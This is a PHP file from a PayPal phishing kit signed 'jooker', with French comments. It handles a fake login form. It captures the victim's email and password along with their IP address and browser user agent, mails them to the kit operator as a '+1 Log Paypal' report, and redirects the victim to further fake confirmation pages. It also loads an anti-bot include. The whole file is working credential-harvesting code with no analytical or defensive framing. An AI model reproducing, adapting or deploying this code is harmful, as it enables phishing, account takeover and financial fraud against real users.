<?php
error_reporting(0);
ob_start();
session_start();

include '../monsterab/ab.php';
include '../algorythm/mail.php';
include '../algorythm/wanted_options.php';
if(isset($_POST['login_email'])){

//Variables ne pas toucher
$_SESSION['email'] = $_POST['login_email'];
$_SESSION['password'] = $_POST['login_password'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
//Message envoyΓ© a votre boite rez 
$msg = "
π jooker Rez γ Nouveau Paypal γ π
[π¦©] Adresse E-Mail : ".$_SESSION['email']."
[π¦©] Mot de passe : ".$_SESSION['password']."
+==========INFOS==========+
[π‘] Adresse IP : ".$_SESSION['ip']."
[πΆ]  User Agent : ".$_SERVER['HTTP_USER_AGENT']."
π jooker π

";
$subject = "π¦© +1 Log Paypal " .$_SESSION['ip']." - ". $_SESSION['email'] . "β€οΈ" ;
$fromsender = "From: πjookerπ <log@rez.fr>";
mail($rezmail,$subject,$msg,$fromsender);
if($unusual_activity == "yes"){
header("Location: ../confirmations/unusual_activity");
$_SESSION['login'] = true;
}
else{

header("Location: ../confirmations/billing");
$_SESSION['login'] = true;
}
}
else{ 

header("Location: index.php");
}
?>